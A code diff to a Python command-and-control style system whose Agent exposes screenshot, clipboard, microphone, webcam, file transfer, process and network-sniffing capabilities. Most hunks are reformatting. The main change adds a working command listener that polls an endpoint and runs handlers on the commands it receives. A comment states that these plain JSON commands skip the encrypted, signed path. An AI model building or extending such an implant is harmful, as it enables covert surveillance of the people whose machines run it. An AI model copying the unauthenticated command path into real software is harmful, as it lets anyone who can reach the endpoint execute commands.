@@ -183,11 +183,7 @@ class ProtocolMessage:
 
     def to_bytes(self) -> bytes:
         """Serialize message to bytes."""
-        signature_b64 = (
-            base64.b64encode(self.signature).decode("ascii")
-            if self.signature
-            else None
-        )
+        signature_b64 = base64.b64encode(self.signature).decode("ascii") if self.signature else None
         data = {
             "version": self.version,
             "type": self.msg_type,
@@ -516,7 +512,9 @@ class Controller:
             message = ProtocolMessage(
                 msg_type="command",
                 payload={
-                    "encrypted_session_key": base64.b64encode(encrypted_session_key).decode("ascii"),
+                    "encrypted_session_key": base64.b64encode(encrypted_session_key).decode(
+                        "ascii"
+                    ),
                     "aes_ciphertext": base64.b64encode(aes_ciphertext).decode("ascii"),
                     "nonce": base64.b64encode(nonce).decode("ascii"),
                     "signature": base64.b64encode(signature).decode("ascii"),
@@ -649,14 +647,32 @@ class Agent:
         self.running = True
         self.start_time = time.time()
 
-        # Initialize transport
-        self.transport = HttpTransport(
-            {
-                "url": self.controller_url,
-                "method": "POST",
-                "headers": {"Content-Type": "application/json"},
+        # Initialize transport using config-driven factory
+        transport_method = self.config.get("transport_method", "http")
+        try:
+            from transport import create_transport_for_method
+
+            # Build a minimal config dict for the transport factory
+            transport_config = {
+                "transport": {
+                    transport_method: {
+                        "url": self.controller_url,
+                        "method": "POST",
+                        "headers": {"Content-Type": "application/json"},
+                    }
+                }
             }
-        )
+            self.transport = create_transport_for_method(transport_config, transport_method)
+        except Exception as e:
+            # Fallback to HttpTransport if factory fails
+            logger.warning(f"Transport factory failed ({e}), falling back to HttpTransport")
+            self.transport = HttpTransport(
+                {
+                    "url": self.controller_url,
+                    "method": "POST",
+                    "headers": {"Content-Type": "application/json"},
+                }
+            )
 
         # Attempt registration
         await self._register()
@@ -749,19 +765,89 @@ class Agent:
                 logger.error(f"Heartbeat error: {e}")
 
     async def _command_listener(self) -> None:
-        """Listen for incoming commands."""
-        # In HTTP mode, commands are received via polling or webhook
-        # For now, we'll simulate by checking periodically
+        """Listen for incoming commands.
+
+        For HTTP transport, this polls a commands endpoint.
+        For WebSocket transport, this receives messages in real-time.
+        Subclasses (like FleetAgent) may override with their own implementation.
+        """
+        poll_interval = self.config.get("command_poll_interval", 5)
+        commands_endpoint = self.config.get("commands_endpoint")
+
         while self.running:
             try:
-                await asyncio.sleep(1)
-                # Commands would be received here via transport.receive() or similar
-                # For HTTP transport, we'd need to implement a polling mechanism
-                # or switch to a WebSocket transport for real-time communication
+                # Check if transport supports real-time receive (WebSocket)
+                transport = self.transport
+                receive_fn = getattr(transport, "receive", None) if transport else None
+
+                if receive_fn is not None and callable(receive_fn):
+                    # Real-time mode: wait for messages
+                    try:
+                        data = await asyncio.wait_for(
+                            asyncio.to_thread(receive_fn),
+                            timeout=poll_interval,
+                        )
+                        if data and isinstance(data, bytes):
+                            response = await self.handle_command(data)
+                            if transport and response:
+                                transport.send(response)
+                    except asyncio.TimeoutError:
+                        continue  # No message received, loop again
+
+                elif commands_endpoint and transport:
+                    # HTTP polling mode: periodically fetch commands
+                    # This requires the transport to support GET requests
+                    # or a separate HTTP client for polling
+                    import requests
+
+                    try:
+                        resp = requests.get(
+                            str(commands_endpoint),
+                            headers={"Content-Type": "application/json"},
+                            timeout=10,
+                        )
+                        if resp.status_code == 200:
+                            commands = resp.json().get("commands", [])
+                            for cmd in commands:
+                                # REST API commands are plain JSON, not encrypted
+                                # Handle them directly instead of going through handle_command()
+                                # which expects encrypted ProtocolMessage format
+                                try:
+                                    # Convert priority string to enum if present
+                                    # Normalize to uppercase since enum members are uppercase
+                                    if "priority" in cmd and isinstance(cmd["priority"], str):
+                                        cmd["priority"] = CommandPriority[cmd["priority"].upper()]
+                                    
+                                    command = Command(**cmd)
+                                    handler = self.command_handlers.get(command.action)
+                                    
+                                    if handler:
+                                        # Run handler in thread pool to avoid blocking event loop
+                                        # This is critical for I/O-bound or long-running handlers
+                                        loop = asyncio.get_running_loop()
+                                        result = await loop.run_in_executor(
+                                            None,  # Use default ThreadPoolExecutor
+                                            handler,
+                                            command.parameters
+                                        )
+                                        logger.debug(f"Command processed: {command.command_id}")
+                                    else:
+                                        logger.warning(f"No handler for action: {command.action}")
+                                except Exception as e:
+                                    logger.error(f"Command execution failed: {e}")
+                    except Exception as e:
+                        logger.debug(f"Command poll failed: {e}")
+
+                    await asyncio.sleep(poll_interval)
+                else:
+                    # No commands endpoint configured, just sleep
+                    await asyncio.sleep(poll_interval)
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error(f"Command listener error: {e}")
+                await asyncio.sleep(poll_interval)
 
     def register_command_handler(
         self, action: str, handler: Callable[[Dict[str, Any]], Dict[str, Any]]
@@ -783,9 +869,7 @@ class Agent:
             # Validate required hybrid-encryption fields
             for field_name in ("encrypted_session_key", "aes_ciphertext", "nonce"):
                 if not payload.get(field_name):
-                    return self._create_error_response(
-                        f"missing_field: {field_name}"
-                    )
+                    return self._create_error_response(f"missing_field: {field_name}")
 
             # Decode base64 fields
             encrypted_session_key = base64.b64decode(payload["encrypted_session_key"])
@@ -884,8 +968,12 @@ class Agent:
                 screenshots=self.config.get("cap_screenshots", self.capabilities.screenshots),
                 file_upload=self.config.get("cap_file_upload", self.capabilities.file_upload),
                 file_download=self.config.get("cap_file_download", self.capabilities.file_download),
-                clipboard_monitor=self.config.get("cap_clipboard", self.capabilities.clipboard_monitor),
-                microphone_record=self.config.get("cap_microphone", self.capabilities.microphone_record),
+                clipboard_monitor=self.config.get(
+                    "cap_clipboard", self.capabilities.clipboard_monitor
+                ),
+                microphone_record=self.config.get(
+                    "cap_microphone", self.capabilities.microphone_record
+                ),
                 webcam_capture=self.config.get("cap_webcam", self.capabilities.webcam_capture),
                 process_monitor=self.config.get("cap_process", self.capabilities.process_monitor),
                 network_sniff=self.config.get("cap_network", self.capabilities.network_sniff),
